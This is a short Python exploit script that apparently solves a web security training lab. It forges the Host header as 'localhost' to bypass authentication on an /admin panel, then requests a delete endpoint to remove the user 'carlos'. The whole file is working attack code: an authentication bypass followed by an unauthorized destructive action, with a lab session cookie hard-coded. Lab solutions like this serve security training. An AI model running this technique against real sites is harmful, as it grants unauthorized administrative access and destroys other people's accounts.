#!/usr/bin/python3

import requests
import sys

from requests.api import head

def connect(url, endpoint, username, cookie):

    headers = {
        "Host": "localhost",    # updating host header to localhost to bypass authentication
        "Cookie": cookie,
    }

    r = requests.get(url + endpoint, headers=headers)
    #print(r.text)

    if "/admin" in r.text:
        print("[INFO] Successfully bypassed authentication!")
        deleteUser(url, endpoint, username, cookie)
    else:
        print("[ERROR] Something went wrong")
        sys.exit(1)

def deleteUser(url, endpoint, username, cookie):

    headers = {
        "Host": "localhost",    # updating host header to localhost to bypass authentication
        "Cookie": cookie,
    }

    r = requests.get(url + endpoint + "/delete?username=" + username, headers=headers)
    # print(r.text)
    # print(r.status_code)

    if username not in r.text:
        print(f"[INFO] Successfully deleted the user: {username}")
    else:
        print("[ERROR] Something went wrong!")
        sys.exit(1)

if __name__ == '__main__':
    url = "https://acd31f461e09cc3fc0ab61c0005500b6.web-security-academy.net"
    endpoint = "/admin"
    username = "carlos"
    cookie = "_lab=46%7cMCwCFCEIE4HQzn1FTA9Fy4jklwE527lKAhQfJs%2fM%2fmXCGO0tCJhdqOUhIhOvv0w21kskW%2bXp2tR93nH9PwVLcFRbPjooi3hy%2bCvifkQJFoA627mGg4JhgNwIK8aXfsymrkj4enFYCCFEw4rfNyWoX71jpSS10pOHS1DzvpW0HGbaO8E%3d; session="

    connect(url, endpoint, username, cookie)